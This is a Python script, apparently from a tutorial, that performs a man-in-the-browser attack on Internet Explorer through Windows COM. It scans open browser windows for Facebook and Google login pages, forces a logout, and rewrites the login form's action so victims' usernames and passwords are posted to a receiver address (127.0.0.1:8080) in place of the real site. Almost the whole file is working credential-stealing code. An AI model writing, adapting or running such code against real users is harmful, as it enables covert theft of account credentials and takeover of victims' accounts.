#code is explained in following page : https://www.codexpace.ml/2022/03/man-in-browser.html
import win32com.client
import time
from urllib.parse import urlparse ,quote



def wait_for_browser(browser) :           
    print(browser)
    while browser.ReadyState != 4 and browser.ReadyState != "complete" :
        time.sleep(1)
        print("[+] sleep end")
    return

data_reciever   =   "http://127.0.0.1:8080"                         

target_site = {}
target_site["m.facebook.com"] = {
                            "logout_url"       : "https://m.facebook.com/logout.php?h=AfeoYOyKEYoBW_OqzUM&t=1613898639&source=mtouch_logout_button&persist_locale=1&button_name=logout&button_location=settings" ,
                            "logout_form"      : "logout_form" ,
                            "login_form_index" : 0,
                            "owned"            : False
                            }
target_site["accounts.google.com"] = {
                            "logout_url"       : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail" ,
                            "logout_form"      : None ,
                            "login_form_index" : 0,
                            "owned"            : False
}
target_site["www.gmail.com"] = target_site["accounts.google.com"]
target_site["myaccount.google.com"] = target_site["accounts.google.com"]
clsid   =   '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'                


WINDOWS =   win32com.client.Dispatch(clsid)

#MAIN LOOP
while True :

    print("[+] Inside loop")
    for browser in WINDOWS :
        url =   urlparse(browser.LocationUrl)
        if url.hostname in target_site :
            if target_site[url.hostname]["owned"] :                 
                continue

            if target_site[url.hostname]["logout_url"]:             
                browser.Navigate(target_site[url.hostname]["logout_url"])
                wait_for_browser(browser)
        else :
            full_doc    =   browser.Document.all                   

            for i in full_doc :
                try :
                    if i.id == target_site[url.hostname]["logout_form"] :
                        i.submit()
                        wait_for_browser(browser)

                except :
                    pass
        try :
            login_index = target_site[url.hostname]["login_form_index"]
            login_page  = quote(browser.LocationUrl)
            print(login_page)
            browser.Document.forms[login_index].action  =   "%s%s" % (data_reciever ,login_page)
            print(browser.Document.forms[login_index].action)
            target_site[url.hostname]["owned"] = True
        except :
            pass
    time.sleep(5)

